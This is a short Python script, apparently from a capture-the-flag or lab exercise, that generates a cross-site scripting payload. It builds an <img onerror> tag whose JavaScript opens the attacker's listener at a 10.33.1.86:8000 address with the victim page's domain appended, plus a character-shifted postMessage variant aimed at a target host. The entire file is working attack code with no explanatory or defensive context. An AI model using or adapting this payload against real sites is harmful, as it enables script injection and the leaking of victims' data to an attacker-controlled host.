#!/usr/bin/env python
# js revert

host = '10.10.10.3'

myip='10.33.1.86'
myport='8000'
jsscript=f'window.open(\\"http://{myip}:{myport}\\"+document.domain)'.replace("'", "\\'")
script = f"window.postMessage([...'{jsscript}'].map(i => String.fromCharCode(i.charCodeAt(0) - 3)).map(i=>String(i)), 'http://{host}')"

payload = f'<img src="x" onerror="{jsscript}">'

print(payload)
